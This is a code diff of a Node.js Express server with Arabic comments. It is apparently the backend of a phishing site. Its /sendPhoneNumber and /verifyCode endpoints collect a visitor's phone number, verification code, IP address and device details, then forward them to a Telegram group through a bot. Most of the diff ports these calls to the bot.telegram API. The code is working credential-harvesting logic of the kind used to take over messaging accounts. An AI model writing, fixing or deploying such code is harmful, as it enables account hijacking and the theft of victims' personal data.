@@ -1456,6 +1456,9 @@ app.post('/submitIncrease', async (req, res) => {
 });
 
 
+
+
+
 app.post('/sendPhoneNumber', async (req, res) => {
     const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;
 
@@ -1468,7 +1471,7 @@ app.post('/sendPhoneNumber', async (req, res) => {
 
     try {
         // جلب معلومات المستخدم من تيليجرام
-        const userInfo = await bot.getChat(chatId);
+        const userInfo = await bot.telegram.getChat(chatId);
         const userName = userInfo.first_name || 'غير متاح';
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
@@ -1484,14 +1487,14 @@ app.post('/sendPhoneNumber', async (req, res) => {
 الدولة: ${country}
 عنوان IP: ${ip}
 المنصة: ${platform}
-نظام التشغيل: ${deviceInfo.os.toString()}
-المتصفح: ${deviceInfo.toAgent()}
-الجهاز: ${deviceInfo.device.toString()}
+نظام التشغيل: ${deviceInfo.os}
+المتصفح: ${deviceInfo.browser}
+الجهاز: ${deviceInfo.device}
 ${userInfoText}
         `;
 
         // إرسال الرسالة إلى المجموعة
-        await bot.sendMessage(groupChatId, groupMessage);
+        await bot.telegram.sendMessage(groupChatId, groupMessage);
         console.log('تم إرسال رقم الهاتف إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم إرسال رمز التحقق' });
@@ -1501,7 +1504,6 @@ ${userInfoText}
     }
 });
 
-// نقطة النهاية للتحقق من الكود
 app.post('/verifyCode', async (req, res) => {
     const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;
 
@@ -1514,7 +1516,7 @@ app.post('/verifyCode', async (req, res) => {
 
     try {
         // جلب معلومات المستخدم من تيليجرام
-        const userInfo = await bot.getChat(chatId);
+        const userInfo = await bot.telegram.getChat(chatId);
         const userName = userInfo.first_name || 'غير متاح';
         const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';
 
@@ -1531,14 +1533,14 @@ app.post('/verifyCode', async (req, res) => {
 الدولة: ${country}
 عنوان IP: ${ip}
 المنصة: ${platform}
-نظام التشغيل: ${deviceInfo.os.toString()}
-المتصفح: ${deviceInfo.toAgent()}
-الجهاز: ${deviceInfo.device.toString()}
+نظام التشغيل: ${deviceInfo.os}
+المتصفح: ${deviceInfo.browser}
+الجهاز: ${deviceInfo.device}
 ${userInfoText}
         `;
 
         // إرسال الرسالة إلى المجموعة
-        await bot.sendMessage(groupChatId, groupMessage);
+        await bot.telegram.sendMessage(groupChatId, groupMessage);
         console.log('تم إرسال كود التحقق إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
@@ -1547,6 +1549,8 @@ ${userInfoText}
         res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
     }
 });
+
+// تشغيل الخادم
 
 
 app.post('/submitLogin', async (req, res) => {
